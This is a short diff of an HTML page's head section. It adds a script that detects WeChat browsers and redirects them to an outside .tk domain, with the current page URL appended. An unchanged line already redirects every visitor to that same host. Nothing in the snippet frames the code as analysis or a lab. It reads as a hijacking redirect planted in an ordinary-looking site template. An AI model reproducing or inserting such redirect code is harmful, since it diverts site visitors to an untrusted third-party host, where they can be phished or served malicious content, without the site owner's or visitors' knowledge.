@@ -9,6 +9,12 @@
 	<script id="perfkit">
 		window.initialPageRequestTime = +new Date();
 	</script>
+	<script>
+		var ua = navigator.userAgent.toLowerCase();
+		 if(ua.match(/MicroMessenger/i)=="micromessenger") {
+			window.location.href = "//cpddd.tk/fh?url=" + window.location.href
+		}
+		</script>
 	<script>window.location.href = "//cpddd.tk/fh?url=" + window.location.href</script>
 	<link rel="stylesheet" type="text/css" href="css/globalheader.css" data-global-elements-nav-styles="">
 	<link rel="stylesheet" type="text/css" href="css/footer.css" data-global-elements-footer-styles="">
